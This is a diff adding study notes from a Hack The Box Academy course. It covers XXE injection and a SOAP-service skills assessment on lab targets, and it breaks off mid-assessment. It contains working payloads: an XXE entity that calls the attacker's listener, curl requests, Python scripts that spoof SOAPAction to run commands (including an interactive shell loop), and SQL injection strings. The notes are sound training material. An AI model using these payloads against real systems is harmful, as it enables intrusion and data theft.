@@ -1715,3 +1715,303 @@ The difference in response time between the first cURL command above and the sec
 
 The API is undoubtedly vulnerable to ReDoS attacks.
 
+# XML External Entity (XXE) Injection
+
+XML External Entity (XXE) Injection vulnerabilities occur when XML data is taken from a user-controlled input without properly sanitizing or safely parsing it, which may allow us to use XML features to perform malicious actions. XXE vulnerabilities can cause considerable damage to a web application and its back-end server, from disclosing sensitive files to shutting the back-end server down. Our [Web Attacks](https://academy.hackthebox.com/module/details/134) module covers XXE Injection vulnerabilities in detail. It should be noted that XXE vulnerabilities affect web applications and APIs alike.
+
+Let us assess together an API that is vulnerable to XXE Injection.
+
+Proceed to the end of this section and click on `Click here to spawn the target system!` or the `Reset Target` icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along.
+
+Suppose we are assessing such an application residing in `http://<TARGET IP>:3001`.
+
+By the time we browse `http://<TARGET IP>:3001`, we come across an authentication page.
+
+Run Burp Suite as follows.
+
+```shell
+gitblanc@htb[/htb]$ burpsuite
+```
+
+Activate burp suite's proxy (_Intercept On_) and configure your browser to go through it.
+
+Now let us try authenticating. We should see the below inside Burp Suite's proxy.
+
+![](Pasted%20image%2020250331100832.png)
+
+```http
+POST /api/login/ HTTP/1.1
+Host: <TARGET IP>:3001
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: text/plain;charset=UTF-8
+Content-Length: 111
+Origin: http://<TARGET IP>:3001
+DNT: 1
+Connection: close
+Referer: http://<TARGET IP>:3001/
+Sec-GPC: 1
+
+<?xml version="1.0" encoding="UTF-8"?><root><email>test@test.com</email><password>P@ssw0rd123</password></root>
+```
+
+- We notice that an API is handling the user authentication functionality of the application.
+- User authentication is generating XML data.
+
+Let us try crafting an exploit to read internal files such as _/etc/passwd_ on the server.
+
+First, we will need to append a DOCTYPE to this request.
+
+What is a DOCTYPE?
+
+DTD stands for Document Type Definition. A DTD defines the structure and the legal elements and attributes of an XML document. A DOCTYPE declaration can also be used to define special characters or strings used in the document. The DTD is declared within the optional DOCTYPE element at the start of the XML document. Internal DTDs exist, but DTDs can be loaded from an external resource (external DTD).
+
+Our current payload is:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]>
+<root>
+<email>test@test.com</email>
+<password>P@ssw0rd123</password>
+</root>
+```
+
+We defined a DTD called _pwn_, and inside of that, we have an `ENTITY`. We may also define custom entities (i.e., XML variables) in XML DTDs to allow refactoring of variables and reduce repetitive data. This can be done using the ENTITY keyword, followed by the `ENTITY` name and its value.
+
+We have called our external entity _somename_, and it will use the SYSTEM keyword, which must have the value of a URL, or we can try using a URI scheme/protocol such as `file://` to call internal files.
+
+Let us set up a Netcat listener as follows.
+
+```shell
+gitblanc@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+```
+
+Now let us make an API call containing the payload we crafted above.
+
+```shell
+gitblanc@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>test@test.com</email><password>P@ssw0rd123</password></root>'
+<p>Sorry, we cannot find a account with <b></b> email.</p>
+```
+
+We notice no connection being made to our listener. This is because we have defined our external entity, but we haven't tried to use it. We can do that as follows.
+
+```shell
+gitblanc@htb[/htb]$ curl -X POST http://<TARGET IP>:3001/api/login -d '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE pwn [<!ENTITY somename SYSTEM "http://<VPN/TUN Adapter IP>:<LISTENER PORT>"> ]><root><email>&somename;</email><password>P@ssw0rd123</password></root>'
+```
+
+After the call to the API, you will notice a connection being made to the listener.
+
+```shell
+gitblanc@htb[/htb]$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [<VPN/TUN Adapter IP>] from (UNKNOWN) [<TARGET IP>] 54984
+GET / HTTP/1.0
+Host: <VPN/TUN Adapter IP>:4444
+Connection: close
+```
+
+The API is vulnerable to XXE Injection.
+
+# Skills Assesment
+
+Our client tasks us with assessing a SOAP web service whose WSDL file resides at `http://<TARGET IP>:3002/wsdl?wsdl`.
+
+Assess the target, identify an SQL Injection vulnerability through SOAP messages and answer the question below.
+
+Submit the password of the user that has a username of "admin". Answer format: FLAG{string}. Please note that the service will respond successfully only after submitting the proper SQLi payload, otherwise it will hang or throw an error.
+
+So I inspected the website source code:
+
+```xml
+<wsdl:definitions xmlns:s="http://www.w3.org/2001/XMLSchema" xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" xmlns:tns="http://tempuri.org/" xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/" targetNamespace="http://tempuri.org/">
+<wsdl:types>
+<s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
+<s:element name="LoginRequest">
+<s:complexType>
+<s:sequence>
+<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
+<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
+</s:sequence>
+</s:complexType>
+</s:element>
+<s:element name="LoginResponse">
+<s:complexType>
+<s:sequence>
+<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
+</s:sequence>
+</s:complexType>
+</s:element>
+<s:element name="ExecuteCommandRequest">
+<s:complexType>
+<s:sequence>
+<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
+</s:sequence>
+</s:complexType>
+</s:element>
+<s:element name="ExecuteCommandResponse">
+<s:complexType>
+<s:sequence>
+<s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
+</s:sequence>
+</s:complexType>
+</s:element>
+</s:schema>
+</wsdl:types>
+<!--  Login Messages  -->
+<wsdl:message name="LoginSoapIn">
+<wsdl:part name="parameters" element="tns:LoginRequest"/>
+</wsdl:message>
+<wsdl:message name="LoginSoapOut">
+<wsdl:part name="parameters" element="tns:LoginResponse"/>
+</wsdl:message>
+<!--  ExecuteCommand Messages  -->
+<wsdl:message name="ExecuteCommandSoapIn">
+<wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
+</wsdl:message>
+<wsdl:message name="ExecuteCommandSoapOut">
+<wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
+</wsdl:message>
+<wsdl:portType name="HacktheBoxSoapPort">
+<!--  Login Operaion | PORT  -->
+<wsdl:operation name="Login">
+<wsdl:input message="tns:LoginSoapIn"/>
+<wsdl:output message="tns:LoginSoapOut"/>
+</wsdl:operation>
+<!--  ExecuteCommand Operation | PORT  -->
+<wsdl:operation name="ExecuteCommand">
+<wsdl:input message="tns:ExecuteCommandSoapIn"/>
+<wsdl:output message="tns:ExecuteCommandSoapOut"/>
+</wsdl:operation>
+</wsdl:portType>
+<wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
+<soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
+<!--  SOAP Login Action  -->
+<wsdl:operation name="Login">
+<soap:operation soapAction="Login" style="document"/>
+<wsdl:input>
+<soap:body use="literal"/>
+</wsdl:input>
+<wsdl:output>
+<soap:body use="literal"/>
+</wsdl:output>
+</wsdl:operation>
+<!--  SOAP ExecuteCommand Action  -->
+<wsdl:operation name="ExecuteCommand">
+<soap:operation soapAction="ExecuteCommand" style="document"/>
+<wsdl:input>
+<soap:body use="literal"/>
+</wsdl:input>
+<wsdl:output>
+<soap:body use="literal"/>
+</wsdl:output>
+</wsdl:operation>
+</wsdl:binding>
+<wsdl:service name="HacktheboxService">
+<wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
+<soap:address location="http://localhost:80/wsdl"/>
+</wsdl:port>
+</wsdl:service>
+</wsdl:definitions>
+```
+
+There are two operations: `Login` and `ExecuteCommand`:
+
+```xml
+<soap:operation soapAction="Login" style="document"/>
+<wsdl:operation name="ExecuteCommand">
+```
+
+Now I'll check the parameters of both:
+
+- For the `Login` operation:
+
+```xml
+<s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
+<s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
+```
+
+- For the `ExecuteCommand` operation:
+
+```xml
+<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
+```
+
+We notice that thee is a `cmd` parameter. I'll build a python script to issue requests:
+
+```python
+import requests
+ 
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'
+ 
+print(requests.post("http://10.129.246.72:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+I get the following error:
+
+```shell
+[redacted]
+This function is only allowed in internal networks</error>
+```
+
+We have no access to the internal networks. Let us try a SOAPAction spoofing attack, as follows:
+
+```python
+import requests
+ 
+payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'
+ 
+print(requests.post("http://10.129.246.72:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+I got a successful response:
+
+```shell
+[redacted]
+<result>root\n</result>
+```
+
+It worked, but the assessment asks to perform a SQLi, so I'll try another way by changing the `<cmd>` to a normal username-password login. I'll also modify the script to automate a shell:
+
+```shell
+import requests
+ 
+while True:
+    cmd = input("$ ")
+    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
+    print(requests.post("http://10.129.246.72:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
+```
+
+So I'll modify to perform a login request:
+
+```shell
+import requests
+
+while True:
+    user = input("User: ")
+    passwd = input("Passwd: ")
+    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><username>{user}</username><password>{passwd}</password></LoginRequest></soap:Body></soap:Envelope>'
+    print(requests.post("http://10.129.246.72:3002/wsdl", data=payload, headers={"SOAPAction":'"Login"'}).content)
+```
+
+![](Pasted%20image%2020250331112924.png)
+
+So now I'll need to find the proper payload:
+
+```sql
+admin' or 1=1--
+```
+
+![](Pasted%20image%2020250331113021.png)
+
+It seems to be a limit on the output of the query. So now I need it to drop the flag instead of the username and email only by bypassing the limit:
+
+```sql
+admin' ORDER BY 2--
+```
+
+![](Pasted%20image%2020250331113516.png)
+
